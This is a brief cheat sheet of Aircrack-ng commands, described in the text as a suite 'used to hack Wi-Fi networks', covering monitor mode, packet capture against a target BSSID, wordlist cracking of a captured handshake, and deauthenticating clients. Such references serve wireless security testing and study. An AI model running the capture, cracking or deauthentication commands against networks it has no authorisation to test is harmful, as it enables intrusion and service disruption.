# Aircrack-ng

Aircrack-ng is a suite used to hack Wi-Fi networks.

## Put an interface into monitor mode
```bash
sudo airmon-ng start [interface]
```

## Stop the monitor of an interface
```bash
sudo airmon-ng stop [interface]
```

## Restart Wi-Fi after using airmon-ng
```bash
ifconfig [interface] up
service NetworkManager restart
```

## Enter the monitor of an interface
```bash
sudo airodump-ng [interface]
```

## Sniff packets from a wireless network
```bash
sudo airodump-ng -c [channel] --bssid [BSSID] -w [output] [interface]
```

## Crack the password using the handshake sniffed by airodump-ng
```bash
aircrack-ng -b [BSSID] -w [wordlist] [cap_file]
```

## Deauthenticate a client from a network
```bash
sudo aireplay-ng -0 [number_of_deauth] -a [BSSID] -c [host] [interface]
```
